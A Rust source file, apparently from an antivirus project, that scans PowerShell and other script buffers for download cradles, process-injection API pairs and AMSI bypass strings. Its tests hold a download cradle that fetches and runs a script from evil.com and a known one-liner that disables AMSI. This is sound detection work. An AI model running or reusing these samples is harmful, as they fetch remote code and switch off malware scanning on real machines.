#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AmsiVerdict {
    Clean,
    Malicious { reason: String },
}

/// Scans a script buffer (e.g., PowerShell, VBScript, JScript) for malicious deobfuscated commands.
pub fn scan_script_buffer(buffer: &[u8], _content_name: &str) -> AmsiVerdict {
    let content = String::from_utf8_lossy(buffer).to_lowercase();

    // High-risk deobfuscated script patterns
    if (content.contains("invoke-expression") || content.contains("iex")) && content.contains("downloadstring") {
        return AmsiVerdict::Malicious {
            reason: "Deobfuscated in-memory download-cradle detected (Invoke-Expression / IEX + DownloadString)".into(),
        };
    }

    if content.contains("virtualalloc") && content.contains("createremotethread") {
        return AmsiVerdict::Malicious {
            reason: "Process injection API sequence in script memory (VirtualAlloc + CreateRemoteThread)".into(),
        };
    }

    if content.contains("amsiutil") || content.contains("amsiinitfailed") {
        return AmsiVerdict::Malicious {
            reason: "AMSI bypass attempt detected in script buffer".into(),
        };
    }

    AmsiVerdict::Clean
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_amsi_script_buffer_scan() {
        let malicious_script = b"IEX ((New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1'))";
        let verdict = scan_script_buffer(malicious_script, "sample.ps1");
        assert_ne!(verdict, AmsiVerdict::Clean);

        let bypass_attempt = b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
        let verdict2 = scan_script_buffer(bypass_attempt, "bypass.ps1");
        assert_ne!(verdict2, AmsiVerdict::Clean);

        let safe_script = b"Write-Host 'Hello from Sentinel AV'";
        assert_eq!(scan_script_buffer(safe_script, "safe.ps1"), AmsiVerdict::Clean);
    }
}
